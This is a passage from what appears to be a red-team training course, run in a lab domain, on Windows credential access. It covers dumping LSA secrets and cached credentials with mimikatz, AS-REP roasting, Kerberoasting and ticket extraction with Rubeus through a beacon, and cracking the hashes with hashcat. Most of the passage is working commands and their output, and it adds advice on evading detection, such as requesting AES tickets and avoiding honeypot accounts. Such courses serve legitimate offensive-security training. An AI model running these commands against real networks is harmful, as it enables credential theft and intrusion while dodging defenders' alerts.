The local RID-500 Administrator differs from the Domain Administrator and is often disabled. The hash is useful when (a) the account is enabled and (b) the same password is reused across every machine in the domain — a common SCCM/imaging artefact.

8.3.3 LSA Secrets

LSA Secrets [T1003.004] stores service account passwords, machine domain account passwords, and EFS keys. Extract from memory or from HKLM\Security\Policy\Secrets (decryption key at HKLM\Security\Policy). Mimikatz's lsadump::secrets fetches and decrypts automatically:

beacon> mimikatz !lsadump::secrets

Domain : LON-WKSTN-1
SysKey : a975bfd9830a0c6a82f3449ccc88432d

Local name : LON-WKSTN-1 ( S-1-5-21-3729176663-3746934411-1052919527 )
Domain name : CONTOSO ( S-1-5-21-3926355307-1661546229-813047887 )
Domain FQDN : contoso.com

Policy subsystem is : 1.18
LSA Key(s) : 1, default {ac3b4c09-dbcc-31b9-0b7b-6b6d44fa8648}
  [00] {ac3b4c09-dbcc-31b9-0b7b-6b6d44fa8648} d29b6c62cff0caac88bf40267d2001c987fd597f4c3f1490da0ff2da60163887

cur/text: sG!&=qn>D(EUr\T!G0F9eP2i.&<@?U[S0djrA@i\Bk+_n_aWG5\N@s<JQ@4X_hV8&rsX,tTL^ nCv >1k*.).kLW`'5)9!&9dMIIDg_v@mdA-Y,Z/Qbe]p*_

    NTLM:3cad4d50decc7d04e6fec0a3c3793cc0
    SHA1:e617ea24446bf924e8b7b2e603e9095e45b96ad3

8.3.4 Cached Domain Credentials

Domain-joined machines cache logon data for offline use. The number of cached logons is controlled by CachedLogonCount at HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon (default: 10, max: 50). The cached credentials use the MS-Cache v2 format — incompatible with pass-the-hash, so extraction [T1003.005] requires offline cracking to recover the plaintext:

beacon> mimikatz !lsadump::cache

Domain : LON-WKSTN-1
SysKey : a975bfd9830a0c6a82f3449ccc88432d

Local name : LON-WKSTN-1 ( S-1-5-21-3729176663-3746934411-1052919527 )
Domain name : CONTOSO ( S-1-5-21-3926355307-1661546229-813047887 )
Domain FQDN : contoso.com

Policy subsystem is : 1.18
LSA Key(s) : 1, default {ac3b4c09-dbcc-31b9-0b7b-6b6d44fa8648}
  [00] {ac3b4c09-dbcc-31b9-0b7b-6b6d44fa8648} d29b6c62cff0caac88bf40267d2001c987fd597f4c3f1490da0ff2da60163887

* Iteration is set to default (10240)

[NL$1 - 17/02/2025 09:52:55]
RID       : 00000451 (1105)
User      : CONTOSO\pchilds
MsCacheV2 : 3566ba05cfe9d5314144ebef07289cdc

[NL$2 - 17/02/2025 09:53:40]
RID       : 00000454 (1108)
User      : CONTOSO\rsteel

Crack with Hashcat mode 2100 — slow due to the 10240 iterations (benchmark: 1085 kH/s on a 4070):

PS C:\Tools\hashcat> .\hashcat.exe -a 0 -m 2100 .\mscachev2.hash .\example.dict -r .\rules\dive.rule
$DCC2$10240#rsteel#0ac91f0033a92c25a174679953789ba:Passw0rd!

8.4 Kerberos Tickets

This section covers basic Kerberos-relevant credential access techniques. A more detailed walk through the protocol itself is in §15.1.

8.4.1 AS-REP Roasting

AS-REP roasting [T1558.004] targets accounts with Kerberos pre-authentication disabled. The KDC responds to an unauthenticated AS-REQ with an AS-REP containing a session key encrypted with the account's hash — crack offline to recover the password. Rubeus' asreproast enumerates every account with pre-auth disabled, requests an AS-REP for each, and prints the encrypted portion:

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /format:hashcat /nowrap

[*] Action: AS-REP roasting
[*] Target Domain          : contoso.com
[*] Searching path 'LDAP://lon-dc-1.contoso.com/DC=contoso,DC=com' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'

[*] SamAccountName         : oracle_svc
[*] DistinguishedName      : CN=Oracle Service,CN=Users,DC=contoso,DC=com
[*] Using domain controller: lon-dc-1.contoso.com (10.10.120.1)
[*] Building AS-REQ (w/o preauth) for: 'contoso.com\oracle_svc'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

$krb5asrep$23$oracle_svc@contoso.com:92D6F[...snip...]19124

Crack RC4 AS-REPs with Hashcat mode 18200:

PS C:\Tools\hashcat> .\hashcat.exe -a 0 -m 18200 .\asrep.hash .\example.dict -r .\rules\dive.rule
$krb5asrep$23$oracle_svc@contoso.com:92d6f[...snip...]19124:Passw0rd!
OPSEC

Detection: multiple 4768 events from one user in short succession. Rubeus requests RC4 tickets by default (easier to crack) — RC4 is anomalous in modern environments that use AES128/256. Request AES tickets to blend in.

8.4.2 Kerberoasting

Kerberoasting [T1558.003] — request TGS-REPs for SPNs, extract the service-account-encrypted portion, crack offline to recover plaintext passwords.

Kerberoasting only works against human-configured domain accounts with weak passwords. Computer accounts are auto-generated (128 chars) and rotated every 30 days — not crackable.

Rubeus' kerberoast enumerates and roasts every non-default SPN:

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /format:hashcat /simple

[*] Total kerberoastable users : 1

$krb5tgs$23$*mssql_svc$contoso.com$MSSQLSvc/lon-sql-1.contoso.com:1433@contoso.com*$95505[...snip...]9A715

Crack with Hashcat mode 13100:

PS C:\Tools\hashcat> .\hashcat.exe -a 0 -m 13100 .\kerb.hash .\example.dict -r .\rules\dive.rule
$krb5tgs$23$*mssql_svc$contoso.com$MSSQLSvc/lon-sql-1.contoso.com:1433@contoso.com*$95505[...snip...]9a715:Passw0rd!
OPSEC

Detection patterns to be aware of:

  • 4769 burst — many TGS-REPs requested by one user in quick succession is a high-fidelity alert
  • RC4 anomaly — Rubeus uses RC4 by default; modern domains expect AES
  • Honeypot SPNs — service accounts with no backing service generate zero legitimate TGS-REQs; auto-enumeration tools trip them

Safer approach: enumerate roastable accounts first, then roast selectively:

beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe -s "(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))" --attributes cn,samaccountname,serviceprincipalname
            
[*] LDAP://DC=contoso,DC=com
[*] CUSTOM SEARCH: 
[*] TOTAL NUMBER OF SEARCH RESULTS: 1
	[+] cn                   : MSSQL Service
	[+] samaccountname       : mssql_svc
	[+] serviceprincipalname : MSSQLSvc/lon-sql-1.contoso.com:1433

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /spn:MSSQLSvc/lon-sql-1.contoso.com:1433 /simple /nowrap

8.4.3 Extracting Tickets

Elevated access allows extracting all cached Kerberos tickets from memory. Rubeus triage enumerates all logon sessions and their tickets — on shared machines, multiple users' TGTs may be present and reusable.

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage

Action: Triage Kerberos Tickets (All Users)

 | 0x3e4    | lon-wkstn-1$ @ CONTOSO.COM | DNS/lon-dc-1.contoso.com              | 17/02/2025 19:32:09 |
